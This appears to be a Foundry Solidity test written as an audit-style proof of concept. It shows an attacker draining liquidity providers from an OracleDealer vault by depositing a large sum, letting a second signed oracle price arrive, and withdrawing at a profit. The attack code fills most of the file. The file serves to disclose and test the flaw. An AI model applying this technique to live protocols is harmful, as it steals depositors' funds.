// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {PriceOracle} from "../src/PriceOracle.sol";
import {MarginLedger} from "../src/MarginLedger.sol";
import {PerpEngine} from "../src/PerpEngine.sol";
import {OracleDealer} from "../src/OracleDealer.sol";

// Two Signed Prices
contract TwoSignedPricesTest is Test {
    MockERC20 usdcMock;
    PriceOracle oracle;
    MarginLedger ledger;
    PerpEngine engine;
    OracleDealer dealer;

    address originalLp = makeAddr("OriginalLP");
    address ordinaryTrader = makeAddr("OrdinaryTrader");
    address attacker = makeAddr("Attacker");

    uint256 constant WAD = 1e18;
    uint256 constant LOW_PRICE = 4_000 * WAD;
    uint256 constant HIGH_PRICE = 4_010 * WAD; // price increase of +0.25%
    uint256 constant ORIGINAL_LP_DEPOSIT = 100_000 ether;
    uint256 constant TRADER_SHORT_SIZE = 10 ether;

    function _deploy() public {
        usdcMock = new MockERC20("USDC Mock", "USDC");
        oracle = new PriceOracle(LOW_PRICE, 1_000);
        ledger = new MarginLedger(usdcMock, oracle);
        engine = new PerpEngine(ledger, oracle, 0.10e18);
        ledger.setEngine(address(engine));
        dealer = new OracleDealer(usdcMock, ledger, oracle, address(engine));

        // LP supplies liquidity
        usdcMock.mint(originalLp, ORIGINAL_LP_DEPOSIT);
        vm.startPrank(originalLp);
        usdcMock.approve(address(dealer), type(uint256).max);
        dealer.deposit(ORIGINAL_LP_DEPOSIT);
        vm.stopPrank();

        // Ordinary trader opens a short perp
        usdcMock.mint(ordinaryTrader, 50_000 ether);
        vm.startPrank(ordinaryTrader);
        usdcMock.approve(address(ledger), type(uint256).max);
        ledger.deposit(ordinaryTrader, 50_000 ether);
        engine.openPosition(dealer, true, TRADER_SHORT_SIZE);
        vm.stopPrank();
    }

    // Execute attack
    function _runAttack(
        uint256 depositAmount,
        bool moveOraclePrice
    ) public returns (int256 profit, int256 remainingVaultValue) {
        usdcMock.mint(attacker, depositAmount);
        vm.startPrank(attacker);
        usdcMock.approve(address(dealer), type(uint256).max);
        dealer.deposit(depositAmount);
        vm.stopPrank();

        if (moveOraclePrice) {
            // Set second signed price
            oracle.setPrice(HIGH_PRICE, 2_000);
        }

        vm.startPrank(attacker);
        uint256 shares = dealer.sharesOf(attacker);
        uint256 withdrawn = dealer.withdraw(shares);
        vm.stopPrank();

        profit = int256(withdrawn) - int256(depositAmount);
        remainingVaultValue = ledger.getAccountValue(
            address(dealer),
            oracle.getPrice()
        );
    }

    function test_DrainLPs() public {
        _deploy();

        uint256 flashloanSizedDeposit = 1_000_000 ether;
        (int256 profit, int256 remainingVaultValue) = _runAttack(
            flashloanSizedDeposit,
            true
        );

        assertGt(profit, 0, "attacker should profit from deposit/withdraw");
    }

    //Same attack but with much smaller deposit to demonstrate that the profit scales with the amount of capital used
    function test_profitsScaleWithCapitalUsed() public {
        _deploy();
        (int256 smallProfit, ) = _runAttack(10_000 ether, true);

        _deploy();
        (int256 largeProfit, ) = _runAttack(1_000_000 ether, true);

        console2.log("Profit with a $10,000 deposit:", smallProfit);
        console2.log("Profit with a $1,000,000 deposit:", largeProfit);

        assertGt(
            largeProfit,
            smallProfit * 5,
            "A 100 times bigger deposit should get a much bigger share"
        );
    }

    // Test to see that there is no profit with no second signed price
    function test_NoProfitWithoutSecondSignedPrice() public {
        _deploy();

        (int256 profit, ) = _runAttack(1_000_000 ether, false);
        console2.log("Profit without oracle update:", profit);

        assertEq(profit, 0, "No change when just deposit and withdraw");
    }
}
